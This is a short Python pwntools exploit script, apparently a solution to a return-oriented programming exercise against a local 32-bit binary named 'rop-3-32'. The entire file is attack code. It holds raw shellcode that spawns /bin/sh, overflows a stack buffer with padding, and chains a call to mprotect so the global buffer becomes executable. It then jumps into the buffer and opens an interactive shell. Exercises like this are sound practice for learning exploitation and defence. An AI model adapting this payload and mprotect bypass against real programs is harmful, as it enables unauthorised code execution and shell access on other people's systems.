#!/usr/bin/env python
from pwn import *

shellcode = 'j2X\xcd\x80PP[YjGX\xcd\x80j\x0bX\x99RYRhn/shh//biT[\xcd\x80'

#context.terminal = ['tmux', 'splitw', '-h']

p = process('./rop-3-32')
#p = process('./rop-3-3x')
#gdb.attach(p, "b *main")

mprotect = p32(0x8048360)
g_buf = p32(0x804a060)

poppoppopret = p32(0x8048408)

buf = shellcode
#buf += "A"*(0x98-len(shellcode)) + "BBBB" + mprotect + poppoppopret + p32(0x804a000) + p32(0x1000) + p32(7) + g_buf
buf += "A"*(0x98-len(shellcode)) + "BBBB" + mprotect + g_buf + p32(0x804a000) + p32(0x1000) + p32(7)

p.sendline(buf)
p.interactive()
